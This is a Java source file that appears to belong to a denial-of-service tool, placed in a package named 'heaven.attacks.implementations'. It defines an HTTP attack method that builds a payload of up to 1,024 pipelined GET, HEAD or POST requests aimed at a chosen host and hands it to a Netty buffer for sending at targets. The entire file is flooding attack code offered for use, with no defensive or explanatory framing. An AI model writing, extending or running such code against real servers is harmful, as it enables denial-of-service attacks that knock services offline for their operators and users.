package heaven.attacks.implementations;

import heaven.Instance;
import heaven.attacks.Method;
import heaven.helpers.HttpVersion;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;

import java.net.InetSocketAddress;

public class Http extends Method {
    byte[] packet;

    public Http(String hostname, HttpVersion version, Http.Type type, int requests) {
        if (requests < 1 || requests > 1024) Instance.exceptionCaught();
        StringBuilder builder = new StringBuilder();
        for (int index = 0; index < requests; index++)
            builder.append(type.identifier.toUpperCase()).append(" / ").append(version.protocolIdentifier).append(System.lineSeparator()).append("Host: ").append(hostname).append(System.lineSeparator()).append(System.lineSeparator());
        packet = builder.toString().getBytes();
    }

    @Override
    public ByteBuf createData(InetSocketAddress target) {
        return Unpooled.buffer().writeBytes(packet);
    }

    public enum Type {
        GET("get"),
        HEAD("head"),
        POST("post");
        public final String identifier;

        Type(String identifier) {
            this.identifier = identifier;
        }

        public static Http.Type getBy(String identifier) {
            for (Http.Type type : values())
                if (identifier.equalsIgnoreCase(type.identifier)) return type;
            throw new NullPointerException("No Type with the name \"" + identifier + "\" was found.");
        }
    }
}
